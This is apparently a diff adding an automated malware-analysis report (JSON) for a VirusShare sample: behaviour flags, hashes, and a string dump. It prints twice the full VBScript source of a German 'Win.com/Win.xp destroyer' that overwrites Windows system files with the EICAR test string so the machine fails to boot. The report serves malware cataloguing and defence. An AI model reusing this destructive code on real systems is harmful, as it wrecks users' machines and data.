@@ -1,0 +1,74 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Shell.Application": "May run an application",
+            "Windows": "May enumerate application windows",
+            "Write": "May write to a file",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "REM  WIN.COM/WIN.XP ZERST\ufffdRER 1.0\n\nREM  HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH\n\nREM  DIESER VIRUS ZERST\ufffdRT DIE WIN.COM bzw Win.xp, indem er sie in einen Virus \ufffdndert, beim n\ufffdchst booten\n\nREM wird Windows nicht mehr gebootet, weil die Win.com bzw Win.xp nicht mehr in der form existiert,\n\nREM falls der Virenscanner nicht schon zuerst die Win.com gel\ufffdscht hat!\n\nset shell = CreateObject(\"Shell.Application\")\n\nset fs = CreateObject(\"Scripting.FileSystemObject\")\n\nset WSHShell = CreateObject(\"Wscript.Shell\")\n\n \n\nordnername = \"C:\\\"\n\n   if not fs.FolderExists(ordnername) then  \n\n             MsgBox \"Der Ordner : '\" + ordnername + \"' konnte nicht gefunden werden !\", vbExclamation\n\n             WScript.Quit\n\n   end if\n\nset ordner = shell.NameSpace(ordnername)\n\nfor k = 1 to 2\n\nIF k = 1 THEN ausgabedatei = \"C:\\windows\\Win.com\"\n\nIF k <> 1 THEN ausgabedatei = \"C:\\windows\\win.xp\"\n\nset ausgabe = fs.CreateTextFile(ausgabedatei, vbTrue)\n\nRem jjoasd\ufffdoifmsdiopmfcnla\ufffdsdf\ufffd\ufffd\ufffdasdlm,fpsdmfpkasdmf\ufffdksdm\ufffdf\ufffdsdmafsd\ufffdF\ufffdSDJMFsdifjsdfkapof\n\n    Print \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\", 78\n\nRem jksdoknoasdinfpbodsanmfodsnpafvjosdiamfviosdanmfopasdjpkofjbpsdkoam\ufffdp\ufffdnfsda,f\ufffd\ufffdnasf\n\nnext \n\nsub Print(was, laenge)\n\n   if laenge>0 then\n\n   was = left(was, laenge)\n\n   if len(was) < laenge then\n\n   was = was + space(laenge - len (was))\n\n   end if\n\n   end if\n\n   ausgabe.Write was\n\nend sub\n\n \n\n\n\n\n\n\n"
+    },
+    "filename": "VirusShare_052d5701f5b9e45f22074a3f62395778",
+    "filesize": 1498,
+    "filetype": "ISO-8859 text, with CRLF, CR line terminators",
+    "hashes": {
+        "md5": "052d5701f5b9e45f22074a3f62395778",
+        "sha1": "b6603314cb1dab99e620c9ba0010ebed1961b7f5",
+        "sha256": "dcd15e26790dd3b036cb88b77b8ab5497f254f89d889a247ba5876e33b587cfe"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "REM  WIN.COM/WIN.XP ZERSTRER 1.0",
+            "REM  HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH",
+            "REM  DIESER VIRUS ZERSTRT DIE WIN.COM bzw Win.xp, indem er sie in einen Virus ndert, beim nchst booten",
+            "REM wird Windows nicht mehr gebootet, weil die Win.com bzw Win.xp nicht mehr in der form existiert,",
+            "REM falls der Virenscanner nicht schon zuerst die Win.com gelscht hat!",
+            "set shell = CreateObject(\"Shell.Application\")",
+            "set fs = CreateObject(\"Scripting.FileSystemObject\")",
+            "set WSHShell = CreateObject(\"Wscript.Shell\")",
+            "ordnername = \"C:\\\"",
+            "   if not fs.FolderExists(ordnername) then  ",
+            "             MsgBox \"Der Ordner : '\" + ordnername + \"' konnte nicht gefunden werden !\", vbExclamation",
+            "             WScript.Quit",
+            "   end if",
+            "set ordner = shell.NameSpace(ordnername)",
+            "for k = 1 to 2",
+            "IF k = 1 THEN ausgabedatei = \"C:\\windows\\Win.com\"",
+            "IF k <> 1 THEN ausgabedatei = \"C:\\windows\\win.xp\"",
+            "set ausgabe = fs.CreateTextFile(ausgabedatei, vbTrue)",
+            "Rem jjoasdoifmsdiopmfcnlasdfasdlm,fpsdmfpkasdmfksdmfsdmafsdFSDJMFsdifjsdfkapof",
+            "    Print \"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*\", 78",
+            "Rem jksdoknoasdinfpbodsanmfodsnpafvjosdiamfviosdanmfopasdjpkofjbpsdkoampnfsda,fnasf",
+            "next ",
+            "sub Print(was, laenge)",
+            "   if laenge>0 then",
+            "   was = left(was, laenge)",
+            "   if len(was) < laenge then",
+            "   was = was + space(laenge - len (was))",
+            "   end if",
+            "   end if",
+            "   ausgabe.Write was",
+            "end sub"
+        ],
+        "file": {},
+        "fuzzing": {
+            "String too long": [
+                "REM  HAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAH"
+            ]
+        },
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.306783",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
